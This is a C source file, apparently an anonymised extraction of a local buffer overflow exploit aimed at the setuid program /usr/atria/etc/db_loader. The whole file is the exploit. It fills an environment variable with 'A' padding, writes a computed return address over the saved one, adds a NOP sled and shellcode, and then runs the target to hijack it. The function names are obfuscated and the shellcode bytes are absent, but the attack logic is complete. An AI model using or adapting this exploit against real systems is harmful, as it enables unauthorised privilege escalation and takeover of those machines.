#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 char* ENV_VAR ; 
 int NNOP ; 
 int /*<<< orphan*/  NOP ; 
 int RET_DIS ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,int /*<<< orphan*/ *) ; 
 int FUNC2 (char*) ; 
 char* FUNC3 (char*) ; 
 scalar_t__ FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 char* shellCode ; 
 int /*<<< orphan*/  FUNC8 (char*,char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*) ; 
 int FUNC10 (char*) ; 

int FUNC11(int argc, char** argv)
{

    char    buff[256] = {0};

    int*    intPtr = NULL;
    char*    buffPtr = NULL;
    char*    charPtr = NULL;

    int    retAddr = 0;
    int    retValue = 0;


    int    buffLen = 0;
    int    adjustment = 0;
    int    strLen = 0;
    int    alignment = 0;
    int    diff = 0;
    int    i;

    int shellCodeLen = FUNC10(shellCode);

    if(argc == 2)
    {
        adjustment = FUNC0(argv[1]);
    }

    buffLen = FUNC10(ENV_VAR) + RET_DIS + NNOP + shellCodeLen + 1;

    charPtr = FUNC3(ENV_VAR);

    /* Adjust the stupid alignment    */
    strLen = FUNC10(charPtr) + 1;
    alignment = strLen % 4;
    if(alignment != 0)
    {
        alignment = 4 - alignment;
        strLen += alignment;
    }

    alignment = buffLen % 4;
    if(alignment != 0)
    {
        alignment = 4 - alignment;
        buffLen += alignment;
    }

    retValue = FUNC2(ENV_VAR);

    diff = buffLen - strLen;

    retAddr = retValue - diff + FUNC10(ENV_VAR) + 1;

    alignment = retAddr % 4;

    if(alignment != 0)
    {
        alignment = 4 - alignment;
    }
    retAddr += RET_DIS + alignment +  adjustment;

    /* Allocate memory for the evil buffer    */
    buffPtr = (char *) FUNC4(buffLen);

    if(buffPtr != NULL)
    {

        FUNC9(buffPtr, ENV_VAR);
        FUNC8(buffPtr, "=");
        charPtr = (char *) (buffPtr + FUNC10(buffPtr));

        /* Fill the rest of the buffer with 'A'     */
        FUNC5(charPtr, 0x41, buffLen - FUNC10(buffPtr)-4);

        /* Butt in the return address            */
        intPtr = (int *) (charPtr + RET_DIS);
        *intPtr++ = retAddr;

        /* Make sure the NOPs are located word aligned     */
        charPtr = (char *) intPtr;
        charPtr += alignment;

        for(i=0; i<NNOP; i++)
        {
            *charPtr++ = NOP;
        }

        for(i=0; i<shellCodeLen; i++)
        {
            *charPtr++ = shellCode[i];
        }
        *charPtr = 0;

        FUNC7(buffPtr);

        FUNC6("Jumping to 0x%.8x\n", retAddr);

        FUNC1("/usr/atria/etc/db_loader", "xfocus", NULL);
    }
    else
    {
        FUNC6("No more free memory!");
    }
}